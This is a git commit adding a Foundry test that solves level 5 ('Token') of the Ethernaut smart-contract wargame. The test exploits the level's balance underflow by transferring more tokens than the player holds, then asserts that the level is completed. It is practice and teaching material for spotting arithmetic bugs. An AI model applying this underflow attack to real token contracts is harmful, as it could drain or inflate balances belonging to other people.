53f017df9a77e44f52208420bb2a95e058716eaf
Do Trung Kien <trungkien.keio@gmail.com>
2022-08-23 15:48:45 +0700

    feat: add level 5 Token

---
+++ test/5.Token.t.sol
@@ -0,0 +1,35 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.9;
+
+import "forge-std/Test.sol";
+import "../src/Ethernaut.sol";
+import "../src/5-Token/Token.sol";
+import "../src/5-Token/TokenFactory.sol";
+
+contract TokenTest is Test {
+    Ethernaut ethernaut;
+    TokenFactory level;
+    Token instance;
+    address player = address(123456);
+    address instanceAddress;
+
+    function setUp() public {
+        ethernaut = new Ethernaut();
+        level = new TokenFactory();
+        ethernaut.registerLevel(level);
+        startHoax(player, player);
+        instanceAddress = ethernaut.createLevelInstance(level);
+        instance = Token(payable(instanceAddress));
+    }
+
+    function testTokenHack() public {
+        instance.transfer(address(999), 21);
+
+        emit log_named_uint("balance of player:", instance.balanceOf(player));
+
+        bool levelCompleted = ethernaut.submitLevelInstance(
+            payable(instanceAddress)
+        );
+        assert(levelCompleted);
+    }
+}
